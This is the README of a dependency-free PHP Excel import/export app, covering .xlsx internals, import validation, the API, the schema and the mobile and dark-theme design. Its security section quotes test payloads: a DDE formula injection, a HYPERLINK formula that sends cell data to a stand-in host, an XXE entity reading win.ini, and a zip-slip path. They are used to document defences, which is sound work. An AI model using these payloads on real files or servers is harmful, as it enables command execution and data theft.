<div align="center">

<img src="assets/images/logo.png" alt="Çılgın Yazılım" width="90">

# Excel Import / Export

Real `.xlsx` generation and parsing in PHP with **zero dependencies**.
No Composer, no PhpSpreadsheet, no `vendor/` directory.

Preview before commit · Row-by-row validation · Transaction safety
Mobile-first card layout · Dark theme

**v1.1.0** · [cilginyazilim.com](https://cilginyazilim.com) · MIT License · [🇹🇷 Türkçe](README.md)

📚 **[Code library](https://cilginyazilim.com/kutuphane)** ·
📘 **[Walkthrough for this example](https://cilginyazilim.com/kutuphane/excel-ice-disa-aktarma)**


[**▶ Live Demo**](https://cilginyazilim.com/kutuphane/uygulama/excel-import-export/) · [Source Library](https://cilginyazilim.com/kutuphane/excel-ice-disa-aktarma) · [cilginyazilim.com](https://cilginyazilim.com)

</div>

<div align="center">

## Live Demo

**No setup, no sign-up, no download — try it in your browser in 3 seconds.**

<a href="https://cilginyazilim.com/kutuphane/uygulama/excel-import-export/"><img src="https://img.shields.io/badge/OPEN_LIVE_DEMO-0b5cb5?style=for-the-badge&logo=googlechrome&logoColor=white&labelColor=061321" alt="Open Live Demo" height="42"></a>
<a href="https://cilginyazilim.com/kutuphane/excel-ice-disa-aktarma"><img src="https://img.shields.io/badge/BROWSE_SOURCE-0ea5e9?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=061321" alt="Browse Source" height="42"></a>
<a href="https://github.com/CilginYazilim/excel-import-export/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/DOWNLOAD_ZIP-16a34a?style=for-the-badge&logo=github&logoColor=white&labelColor=061321" alt="Download ZIP" height="42"></a>

<br><br>

<a href="https://cilginyazilim.com/kutuphane/uygulama/excel-import-export/" title="Click to open the live demo">
  <img src="assets/images/screenshot.png" alt="Excel import/export live demo preview" width="860">
</a>

<sub>▲ Click the image to open the demo</sub>

</div>

> **Download a real .xlsx, edit it, upload it back — with no Composer and no PhpSpreadsheet.**

---

## What does it do?

A two-way Excel bridge:

| Direction | What it does |
|-----------|--------------|
| **Export** | Downloads database records as a formatted `.xlsx`. Header row frozen, filter arrows enabled, dates are real dates and salaries are real numbers. If a search is active on screen, only the filtered records are exported. |
| **Import** | Reads the uploaded `.xlsx`, validates every row and shows you the result **before writing anything**. On approval it is written inside a single transaction. |

Plus **template download**: an empty file with the correct headers and two sample rows. Most failed uploads are prevented before they start.

### Import preview

Before saving you see exactly what will happen to each row — which is new, which will be updated, which is already identical, which is invalid and **why**:

![Import preview](assets/images/screenshot-import.png)

### On a phone

On a narrow screen the nine-column table **turns into cards**; the column headers move to the left of each value as labels. There is no horizontal scrolling — every field is visible at a glance:

<div align="center">

<img src="assets/images/screenshot-mobile.png" alt="Mobile card layout" width="330">

</div>

---

## How does "zero dependencies" work? (the most instructive part)

`.xlsx` is **not** a magic binary format — it is zipped XML. Rename any Excel file to `.zip`, open it, and you will find:

```
[Content_Types].xml          → what type each part in the package is
_rels/.rels                  → which part is the package root
xl/workbook.xml              → the sheet list
xl/_rels/workbook.xml.rels   → which file sheet1 actually lives in
xl/styles.xml                → fonts, fills, number formats
xl/worksheets/sheet1.xml     → THE ACTUAL DATA (rows and cells)
```

`XlsxWriter` produces exactly these six files and packs them with `ZipArchive`. `XlsxReader` opens the package and reads it back with `XMLReader`. All you need are PHP's built-in `zip`, `xml` and `mbstring` extensions (bundled with XAMPP).

A single cell looks like this inside the file:

```xml
<c r="B2" s="2" t="inlineStr"><is><t>Evren</t></is></c>
```

`r` is the cell address, `s` the style index, `t` the cell type. We write text with `inlineStr` instead of the `sharedStrings.xml` pool: the file grows slightly, but the code becomes far easier to follow. The right trade-off for a teaching project.

**When should you switch to PhpSpreadsheet?** If you need formulas, charts, multiple sheets, merged cells, or `.xls`/`.ods` support. These classes exist for **data exchange**, not report design.

---

## Four classic traps, solved

Almost every piece of Excel-reading code stumbles on at least one of these:

**1. Dates are numbers, not text.**
`15.08.2026` is stored as `46249`. Whether a number is a date or just a number can only be decided by looking at **the cell's style**. `XlsxReader` parses the number formats in `styles.xml` and builds a "which styles mean date" list. Excel's famous 1900 leap-year bug is compensated for by treating the epoch as 30 December 1899.

**2. Empty cells are not written at all.**
If column B is empty, the `<c r="B2">` tag simply **does not exist**; the row jumps from A to C. Reading cells in order shifts your columns. The fix: read the address in each cell's `r` attribute (`C7`) and compute the column index from it.

**3. Text is not stored in the cell.**
Excel keeps repeated strings in a `sharedStrings.xml` pool and writes only the pool index in the cell. On top of that, if part of a word is bold the text is split into `<r>` runs and reading a single `<t>` is not enough.

**4. The sheet is not necessarily named `sheet1.xml`.**
Google Sheets and LibreOffice produce different names. The correct route: take the first sheet's `r:id` from `workbook.xml` and resolve it through `workbook.xml.rels`.

---

## Installation

```bash
# 1. Put the files in your web root
cd C:/xampp/htdocs
git clone https://github.com/CilginYazilim/excel-import-export.git

# 2. Import the database (it creates the cy_excel schema itself)
mysql -u root -p < excel-import-export/cy_excel.sql
```

Then open: `http://localhost/excel-import-export/`

### Where do the database credentials go?

There are three options; the application reads them in this **order of precedence**:

| Priority | Location | When |
|----------|----------|------|
| 1 | `system/config.local.php` | **Recommended.** Never committed, never wiped by a deploy |
| 2 | Environment variables (`DB_HOST`, `DB_NAME`, `DB_USER`, `DB_PASS`) | Docker / CI / platform hosting |
| 3 | Defaults in `system/config.php` | Local XAMPP trial only (root / empty password) |

The recommended path is two steps:

```bash
cp system/config.local.php.example system/config.local.php
# then fill in the four DB_* lines in the copy
```

`config.local.php` is in `.gitignore`, so your password never reaches the repository. `system/.htaccess` also blocks that file from being requested over HTTP — so that if the PHP handler is ever lost, the file is not served as plain text.

**Before going live:** set `APP_DEBUG` to `false`. Adding `define('APP_DEBUG', false);` to `config.local.php` is enough; you never need to touch `config.php`.

**Requirements:** PHP 8.1+ (`zip`, `xml`, `mbstring`, `gd`) · MySQL 5.7+ / MariaDB 10.3+ · A modern browser (uses CSS `env()` and flexbox)

### Environment variables

Put them in a **`.env`** file at the repository root and never touch
`system/config.php`:

```bash
cp .env.example .env        # Windows: copy .env.example .env
```

`.env` is in `.gitignore`: it never reaches the repository and a deploy
does **not** delete it. `system/config.php`, by contrast, lives in the
repository and is replaced by the repository's copy on every deploy — a
password written there both ships to GitHub and disappears on the first
deploy.

The app runs without the file too; the defaults below match a local XAMPP
install.

**Lookup order:** `.env` → the real environment variable (Apache `SetEnv`,
systemd…) → the default shown here.

| Variable | Default | What it does |
|---|---|---|
| `DB_HOST` | `127.0.0.1` | Database server |
| `DB_NAME` | `cy_excel` | Database name |
| `DB_USER` | `root` | User |
| `DB_PASS` | *(empty)* | Password — **never hard-code it** |
| `APP_TIMEZONE` | `Europe/Istanbul` | PHP timezone |
| `APP_DEBUG` | *from environment* | Whether errors are printed to the page |

**Why `APP_TIMEZONE`?** The `date.timezone` in XAMPP's `php.ini` can
differ from the system timezone MySQL uses. On the test machine PHP was
`Europe/Berlin` while MySQL was `Europe/Istanbul`, so two lines describing
the same instant were an hour apart. The time **arithmetic** is done in
SQL and was always correct — what drifted was the clock PHP printed. The
timezone is now pinned explicitly; if your server is in another region,
set this variable instead of touching the code.


---

## What each file does

```
excel-import-export/
├── index.php                        ← Page skeleton
├── cy_excel.sql                     ← Database setup (cy_excel schema + 50 sample rows)
├── system/
│   ├── .htaccess                    ← ALLOWLIST: only ajax.php and export.php are reachable
│   ├── config.php                   ← Settings + PDO connection + session + APP_VERSION
│   ├── config.local.php.example     ← Template to copy (never put a password in it)
│   ├── function.php                 ← Helpers, validators, COLUMN DEFINITIONS
│   ├── ajax.php                     ← JSON endpoint (CRUD + preview + commit)
│   ├── export.php                   ← File-download endpoint
│   ├── views/                       ← Modal windows (partial templates)
│   │   ├── .htaccess                ← Blocks direct requests
│   │   ├── modal-user.php           ← Add / edit form
│   │   ├── modal-detail.php         ← Record detail
│   │   ├── modal-delete.php         ← Delete confirmation
│   │   └── modal-import.php         ← Import wizard
│   └── Excel/
│       ├── XlsxWriter.php           ← Produces .xlsx via ZipArchive
│       └── XlsxReader.php           ← Parses .xlsx via XMLReader
├── assets/
│   ├── css/cilginyazilim.css        ← Shared brand design system (dark theme included)
│   ├── css/style.css                ← Page-specific styles + MOBILE LAYOUT
│   └── js/app.js                    ← All UI behaviour + theme switch
└── upload/                          ← Profile images (protected by .htaccess)
```

### Notable functions

| Function | File | What it does |
|----------|------|--------------|
| `excel_columns()` | function.php | **Single source of truth.** Which column, which label, which type, required or not |
| `excel_header_aliases()` | function.php | `E-Posta`, `eposta`, `mail`, `EMAIL ADDRESS` → all map to the `email` field |
| `normalize_header()` | function.php | Simplifies a header: folds Turkish letters to ASCII, strips spaces/dashes/parentheses |
| `validate_maas()` | function.php | Accepts `92.500,75`, `92500.75` and `92.500,75 ₺` alike |
| `user_row_changed()` | function.php | Did the row actually change? If not, no `UPDATE` is issued at all |
| `find_existing_users()` | ajax.php | Solves the N+1 query problem: one query per 500-item chunk |
| `needsFormulaGuard()` | XlsxWriter.php | `quotePrefix` protection against formula injection (see below) |

### Adding a new column

Column definitions live in one place: `excel_columns()` in `system/function.php`. Three steps:

1. Add the column to `cy_excel.sql`
2. Add a row to the `excel_columns()` array
3. Add its validation inside `validate_import_row()`

Export, template, header matching and the preview table all read that definition, so everything else follows automatically.

---

## How import works

```
Pick a file
   ↓
[1] import_preview  ── writes NOTHING to the database
   │   · is this really a valid xlsx package?
   │   · does the row count exceed the limit? (if so it is REJECTED, not truncated)
   │   · do the headers map to field names?
   │   · every row is validated individually
   │   · every row is compared against the EXISTING record:
   │       insert / update / no change?
   │   · rows to be written are stored in the SESSION
   ↓
Preview table: green = new, blue = update,
               grey = unchanged, red = invalid
   ↓
[2] import_commit  ── one transaction, all or nothing
```

**Headers are flexible.** Column order does not matter; the header text is what counts. `E-Posta`, `eposta`, `mail`, `EMAIL ADDRESS` are all recognised. Unknown columns (`#`, `Created At`, `Notes`) are silently ignored — so you can export a file, edit it, and upload it straight back.

**Email is the key.** If a record with the same email exists it is updated, otherwise inserted. On update the **profile image and creation date are left untouched** — Excel does not carry that information, and losing it to an import is unacceptable.

**Unchanged rows are skipped silently.** If every field of a row matches the database exactly, it is not marked "will update" and no `UPDATE` query runs.

**Localised formats are accepted.** `105.000,50` and `105000.50` are the same number; `04.03.2019` and `2019-03-04` are the same date. Non-existent dates such as `31.02.2019` are rejected.

### Columns

| Column | Required | Note |
|--------|----------|------|
| Ad (First name) | ✔ | At least 2 characters, letters only |
| Soyad (Last name) | ✔ | |
| E-posta (Email) | ✔ | Must be unique; it is the import key |
| Departman (Department) | | Optional |
| Maaş (Salary) | | Optional |
| Başlama Tarihi (Start date) | | Optional |

---

## API endpoints

All accept **POST** and require a **CSRF token** (`csrf_token` field or `X-CSRF-Token` header).

### `system/ajax.php` — returns JSON

| `action` | Parameters | Returns |
|----------|------------|---------|
| `list` | DataTables protocol (`draw`, `start`, `length`, `order`, `search`) | `{draw, recordsTotal, recordsFiltered, data[]}` |
| `fetch` | `id` | Raw + formatted fields of one record |
| `add` | `name`, `surname`, `email`, `departman`, `maas`, `baslama_tarihi`, `image_user` | `{success, description, id}` |
| `edit` | `user_id` + the above | `{success, description, id}` |
| `delete` | `id` | `{success, description, id}` |
| `import_preview` | `import_file` (file) | `{token, columns, fields, rows[], summary}` |
| `import_commit` | `token` | `{success, description, inserted, updated, skipped}` |

### `system/export.php` — returns a file

| Parameter | Value | Result |
|-----------|-------|--------|
| `export` | `data` | Records download as `.xlsx` (filtered if `search` is given) |
| `export` | `template` | Empty template downloads |

### HTTP status codes

| Code | Meaning |
|------|---------|
| `200` | Success |
| `400` | Bad request (invalid ID etc.) |
| `403` | Invalid CSRF token / session expired |
| `404` | Record not found |
| `405` | Non-POST request |
| `422` | Validation error (form field or invalid file) |
| `500` | Server error |

> **Why no 419?** "419 Page Expired" is a non-standard code. We measured it on this setup: Apache silently rewrote the unknown 419 into a **500** — so while trying to say "your session expired" we were telling the browser "the server crashed". `403` is the correct answer.

---

## Database schema

The `cy_excel` database, one table:

```sql
CREATE TABLE `users` (
  `id`             INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `name`           VARCHAR(150) NOT NULL,
  `surname`        VARCHAR(150) NOT NULL,
  `email`          VARCHAR(190) NOT NULL,      -- the IMPORT KEY
  `departman`      VARCHAR(100) NOT NULL DEFAULT '',
  `maas`           DECIMAL(10,2) DEFAULT NULL, -- NOT FLOAT: money needs DECIMAL
  `baslama_tarihi` DATE DEFAULT NULL,
  `image`          VARCHAR(191) NOT NULL DEFAULT '',
  `tarih`          TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_users_email` (`email`),
  KEY `idx_users_name` (`name`),
  KEY `idx_users_surname` (`surname`),
  KEY `idx_users_departman` (`departman`),
  KEY `idx_users_tarih` (`tarih`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
```

Three decisions, three reasons:

- **`DECIMAL(10,2)`, not `FLOAT`.** Binary floating point gives you `0.1 + 0.2 = 0.30000000000000004` and corrupts accounting records.
- **`UNIQUE` on `email`.** This is the rule the "update if exists, insert otherwise" behaviour rests on. The 190-character limit comes from the utf8mb4 + InnoDB index byte limit (190 × 4 = 760 bytes).
- **`image` is empty in the sample data.** The repository ships no sample images; if we wrote filenames there, every fresh install would hit a "database says there is a photo but the disk is empty" mismatch. When empty, the app renders an initial badge instead.

---

## Security layers and **why** they exist

Every item below was verified by measurement; the measured result is stated.

### Excel formula injection (`quotePrefix`)

What happens if someone puts `=cmd|'/c calc'!A0` or `=HYPERLINK("http://x/?"&A1,"click")` into a cell?

**Measurement:** We wrote that value into the `Departman` field via import, exported it, then unpacked the resulting file and inspected it. The cell was written as:

```xml
<c r="E52" s="2" t="inlineStr"><is><t>=cmd|&apos;/c calc&apos;!A0</t></is></c>
```

That is `t="inlineStr"` — a **text** cell. There is no `<f>` (formula) tag anywhere in the file. An `.xlsx` cell is only a formula if `<f>` is present, so **opening this file in Excel does not execute anything.** The classic CSV "I opened the file and a command ran" scenario does not apply here.

**So why add protection anyway?** Because the text is still *formula syntax*, and Excel re-interprets a cell's content when it is **re-entered**. Three ordinary user actions turn it into a live formula: double-clicking the cell and pressing Enter, copying the column and pasting it elsewhere, or exporting the data as CSV later (CSV has no `<f>` distinction — every cell starting with `=` is a formula).

**The fix:** text cells starting with `=`, `+`, `-`, `@`, tab or carriage return are given OOXML's `quotePrefix="1"` style, which tells Excel "the user entered this as text".

The common advice of "prepend a single quote" was **deliberately not used**: in `.xlsx` the apostrophe is a UI display convention, not part of the cell text. Writing a real apostrophe would show `'=cmd...` in the cell — i.e. it would corrupt the data.

**Legitimate data is not corrupted** (measured): `-1250.75` and `+90 555 111 22 33` still display exactly as written and survive a write-read round trip byte for byte. Money and date columns never take this path since they go through the `money`/`date` cell types.

### XXE (external entity) attacks

**Measurement:** We built two `.xlsx` files embedding `<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>` — one through `sheet1.xml`, the other through `sharedStrings.xml`. Result: the first was rejected as malformed XML, and in the second the entity resolved to an **empty string**. No `win.ini` content leaked anywhere.

The protection: `simplexml_load_string()` is called with `LIBXML_NONET`, and `LIBXML_NOENT` is **never** added (that flag would re-open the hole). PHP 8 disables external entity loading by default; this is the second lock.

### Zip slip (archives with `../` paths)

**Measurement:** We uploaded an `.xlsx` containing an entry named `../../../../xampp/htdocs/excel-import-export/upload/slipped.php`. The file was **never written** to disk.

The reason is structural: `XlsxReader` never extracts the archive (there is no `extractTo()` call). It only uses `getFromName()` and the `zip://` stream, so path names inside the package are never interpreted as filesystem paths.

### Zip bombs

Before opening the package, the total uncompressed size declared by the archive is checked and anything over the limit is rejected.

**Measurement:** With the limit at 64 MB, a 169 KB upload expanded into a 55 MB `sharedStrings.xml` and pushed PHP's peak memory to 88 MB — roughly 500× amplification. Not fatal, but unnecessary: the import limit is already 5 MB and 2000 rows, and a genuine 10,000-row file is only 313 KB. The limit was lowered to **24 MB**, and the bomb file is now rejected with `422`.

### The upload directory (`upload/.htaccess`)

**Measurement (before):** `.php` and `.phtml` requests returned `403` (good), **but** `/upload/x.gif` and `/upload/x.html` returned `200` carrying **not a single security header**. An "image" with HTML/JS inside could execute script on the site's own origin if the browser sniffed the MIME type (stored XSS).

**After:** the layers below were added and re-measured.

| Layer | Why |
|-------|-----|
| `<FilesMatch>` script-extension denial | Even if every other layer is bypassed and a `.php` lands here, it cannot execute. The list is long because we cannot know which extension is interpreted on a given server |
| `php_flag engine off` (guarded by mod_php) | Only works under mod_php; silently ignored under PHP-FPM — which is why it is not relied on alone |
| `Options -Indexes -ExecCGI` | Filenames are random, so unguessable URLs are the only protection. Directory listing would make that protection meaningless |
| `X-Content-Type-Options: nosniff` | Stops the browser guessing "this is actually HTML" and running an image as a page |
| `Content-Security-Policy` (`sandbox`) | Second belt: even if a response is treated as HTML, no script runs; `sandbox` puts the document in an opaque origin with no cookie access |
| `X-Frame-Options: DENY` | Clickjacking and image-based phishing |
| `Referrer-Policy: no-referrer` | Random filenames must not leak to third-party sites as referrers |

**Verification (after):** `.php`, `.PHP`, `.php5`, `.phtml`, `php.` and `x.php/y.png` (path-info) requests all return **403**; a legitimate `.png` still returns **200 `image/png`** and carries every security header.

### Other layers

- **CSRF** — **every data-returning endpoint**, `list` included, is verified. (Previously `list` was unprotected while the docs claimed "every request" — the browser cannot read the response cross-origin thanks to CORS, so it was not a leak, but the rule should have no exceptions.) Comparison uses constant-time `hash_equals()`.
- **File type is verified from content** — Extension and MIME are only a first pass. The real check: is this genuinely a valid ZIP containing `xl/workbook.xml`? **Measured:** a `.php` file uploaded with a fake `.xlsx` name and fake MIME is rejected with `422`.
- **Image uploads** — The type is verified from content with `getimagesize()`; the new name and extension come from **our** whitelist, not from the submitted filename. That way `virus.php.png` can never be written under that name. Names are randomised with `random_bytes(16)`.
- **The row limit does not truncate silently** — **Measured bug:** a 10,000-row file was silently reduced to 2000 rows and the remaining 8,000 vanished without warning, while the user saw a green "completed" message. The reader is now asked for one row beyond the limit so overflow is detected and the file is **rejected** — silent data loss is far worse than a visible error.
- **Transactions** — **Measured:** a database error was triggered in the middle of a 500-row import; the record count returned to its pre-import value (50) with not a single row left behind.
- **Preview data is kept server-side** — If it were round-tripped through the client, anyone wanting to bypass validation could edit the JSON in between.
- **Single-use preview** — The committed batch is removed from the session, so the same preview cannot be approved twice.
- **SQL injection** — Every query uses prepared statements. The sort column cannot be bound, so it goes through a whitelist.
- **XSS** — `e()` (htmlspecialchars) on the server; on the client every cell is filled with `.text()`, never `.html()`.
- **Partial templates cannot be called directly** — **Measured leak:** requesting `system/views/*.php` directly produced a PHP warning containing the server's absolute path (`C:\xampp\htdocs\...`). Both a `CY_APP` constant and `views/.htaccess` now block it (`403`).

---

## Mobile layout — turning the table into cards

A nine-column table does not fit a 360-pixel phone. The common fix is `overflow-x: auto`; this repository used it for a while and it produced **two concrete problems**:

1. Only `#` and `Photo` fit on screen, so reading the actual data (email, salary) meant scrolling right and back on every single row.
2. **Comparison became impossible:** you could not see two salaries at the same time — which is the whole reason to look at a list.

Below `767.98px` every `<tr>` now becomes a **card**:

```
┌──────────────────────────────────────┐
│ [A]  Ayşe  ŞAHİN                 #61 │
│ ──────────────────────────────────── │
│ EMAIL       ayse.sahin@ornek.com     │
│ DEPARTMENT  Pazarlama                │
│ SALARY      55.300,00                │
│ START DATE  06.09.2021               │
│ ──────────────────────────────────── │
│  [ 👁 ]      [ ✎ ]       [ 🗑 ]      │
└──────────────────────────────────────┘
```

### Where do the labels come from?

Once `<thead>` is hidden, you can no longer tell which column "Pazarlama" belongs to. CSS restores that by printing the `data-label` value to the left of every cell:

```css
#user_data td::before {
    content: attr(data-label);
    width: 6.5rem;          /* fixed width → values line up vertically */
}
```

The `data-label` attribute is set by `rowCallback` in `app.js`, which reads the labels **from `<thead>`**:

```js
var COLUMN_LABELS = $('#user_data thead th').map(function () {
    return $(this).text().trim();
}).get();
```

Had the labels been typed into the CSS by hand, the column list would exist in two places; update one and forget the other and **the mobile user reads the wrong label** — a bug with no trace whatsoever on desktop. As written, the chain `excel_columns()` → `<thead>` → mobile label is fed from one source.

### Why not the DataTables `responsive` extension?

The extension adds ~40 KB of JS/CSS and turns rows into expand/collapse widgets: you still need a tap to see the data. This solution adds **no library at all** and every field is visible at a glance — which also matches the project's zero-dependency stance.

### A hidden trap: inline width

After initialisation DataTables measures the table and writes its width as an **inline** style, e.g. `<table style="width: 1148px">`. An inline style beats every rule in an external file, which is why the card layout overflowed the screen on the first attempt. The fix is scoped to narrow screens:

```css
@media (max-width: 767.98px) {
    #user_data { width: 100% !important; min-width: 0 !important; }
}
```

Setting `autoWidth: false` in DataTables would also work, but that option breaks the **desktop** column widths too. The problem only exists on narrow screens, so the fix stays there.

### Other mobile fixes

| Problem | Fix |
|---------|-----|
| Toolbar scrolled sideways and the **"Import" button was invisible** | Two rows: search full width on top, three equal-width buttons below |
| 34-pixel action icons were missed by fingers | Full width under the card, **44 px** tall (the accepted minimum touch target) |
| Modals squeezed into the middle, leaving unusable margins | `modal-fullscreen-sm-down` (`md-down` for the import wizard) |
| Modal buttons side by side, "Cancel" too close to "Save" | Stacked, full width, **primary action on top** (`column-reverse`) |
| iOS Safari zoomed in on form fields and never zoomed back out | `font-size: 16px` on inputs — the only switch that disables that behaviour |
| Toasts appeared in the top-right, unreachable one-handed | Bottom of the screen, full width, with `env(safe-area-inset-bottom)` padding |
| The fixed background layer stuttered while scrolling on iOS | `background-attachment: scroll` on mobile |
| Rotating the phone made modals overflow the screen | `@media (orientation: landscape)` → the body scrolls inside itself |

---

## Dark theme

The brand design system (`cilginyazilim.css`) looks at two sources at once:

```css
@media (prefers-color-scheme: dark) { :root:not([data-cy-theme="light"]) { … } }
:root[data-cy-theme="dark"] { … }
```

The 🌙 / ☀ button in the header changes **only the `data-cy-theme` attribute**; not a single colour value lives in JavaScript. There are three states, not two:

| Attribute | Result |
|-----------|--------|
| absent (default) | Follows the system preference; when the phone goes dark in the evening, so does the page |
| `data-cy-theme="dark"` | Always dark |
| `data-cy-theme="light"` | Always light |

The preference is kept in `localStorage` and applied **inside `<head>`**, before the page paints. `app.js` loads at the bottom of the page, so putting it there would draw the light theme first and jump to dark a moment later — a white flash on every page load. Because `localStorage` access throws in private windows, both the read and the write are wrapped in `try/catch`.

---

## Performance (measured)

| Operation | Result |
|-----------|--------|
| Reading a 10,000-row `.xlsx` (`XlsxReader`, CLI) | **5.1 s**, peak memory **8 MB** |
| Writing a 10,000-row `.xlsx` (`XlsxWriter`, CLI) | peak memory **18 MB**, 313 KB file |
| 1,900-row import preview (HTTP, end to end) | **0.94 s** |

Memory stays low because `XlsxReader` never loads the whole document: it walks the file with `XMLReader` like a cursor and hands only the current row to `SimpleXML`. The best of both approaches — low memory plus readable code.

The default limit is 2,000 rows (`IMPORT_MAX_ROWS`), because validated rows are held in the session until the approval step. For larger files, write to a temporary table instead of the session.

---

## Customisation

| What | Where |
|------|-------|
| Database credentials | `system/config.local.php` (recommended) or environment variables |
| Upload size limits | `config.php` → `UPLOAD_MAX_BYTES`, `IMPORT_MAX_BYTES` |
| Row limit | `config.php` → `IMPORT_MAX_ROWS` |
| Allowed image types | `config.php` → `ALLOWED_IMAGE_TYPES` |
| Export filename prefix | `config.php` → `EXPORT_FILENAME_PREFIX` |
| Columns (add/remove/rename) | `function.php` → `excel_columns()` |
| Header aliases | `function.php` → `excel_header_aliases()` |
| Excel colours / styles | `XlsxWriter.php` → `stylesXml()` |
| Page-specific appearance | `assets/css/style.css` |
| Mobile breakpoint | `style.css` → `@media (max-width: 767.98px)` |
| Brand colours / dark palette | `cilginyazilim.css` → `:root` and `[data-cy-theme]` blocks |
| Version number | `config.php` → `APP_VERSION` (shown in the card footer) |

> **Do not touch `assets/css/cilginyazilim.css`.** It is the shared brand design system used across projects; everything page-specific belongs in `style.css`.

---

## Example use cases

- **HR / staff lists** — Bulk-load the Excel your payroll system produces, export the current list back out (that is exactly what this repository demonstrates).
- **Product catalogue** — Import a supplier's price list. Make `stok_kodu` the key instead of `email`: change `excel_columns()` and the `UNIQUE` index, everything else stays the same.
- **Student / grade entry** — Upload the template a teacher filled in. The preview step is critical here: the wrong class's file never gets committed unnoticed.
- **Accounting / ledger transfer** — The `DECIMAL` choice and localised number parsing pay off directly.
- **Bulk mailing-list cleanup** — Invalid addresses show up red in the preview and are **not imported**, so the list stays clean.
- **Periodic data sync** — Thanks to the "skip unchanged rows" behaviour the same file can be uploaded daily; only real changes are written.

---

## Changelog

### v1.1.0

- **Mobile card layout** — the nine-column table becomes cards on narrow screens; horizontal scrolling is gone and column labels are generated from `<thead>`.
- **Dark theme switch** — follows the system preference, remembers the user's choice in `localStorage`, and no longer flashes on page load.
- **Touch targets raised to 44 px**; modals go fullscreen on narrow screens and their buttons stack full width.
- **iOS auto-zoom disabled** (`font-size: 16px` on form fields).
- **Toasts moved to the bottom of the screen** with `safe-area-inset` padding.
- **`config.local.php` is finally read** — the file shipped as a template and `system/.htaccess` protected it, but `config.php` never included it; anyone who put their password there was silently running on the default credentials.
- `APP_DEBUG` can be set from an environment variable or from `config.local.php`; a new `APP_VERSION` constant is shown in the card footer.
- The `.gitignore` pattern was widened to `system/config.local.*`, so any copy placed beside it stays hidden by default.

### v1.0.0

- Zero-dependency `.xlsx` reading/writing, preview-before-commit import, server-side DataTables, security layers.

---

## License

MIT — download and use it however you like.
Copyright: **Çılgın Yazılım** ([cilginyazilim.com](https://cilginyazilim.com))

To contribute, fork the repository and open a pull request:
[github.com/CilginYazilim/excel-import-export](https://github.com/CilginYazilim/excel-import-export)

---

<div align="center">

### More code examples

**[📚 cilginyazilim.com/kutuphane](https://cilginyazilim.com/kutuphane)**

Step-by-step walkthrough of this example:
**[Excel Import / Export](https://cilginyazilim.com/kutuphane/excel-ice-disa-aktarma)**

</div>
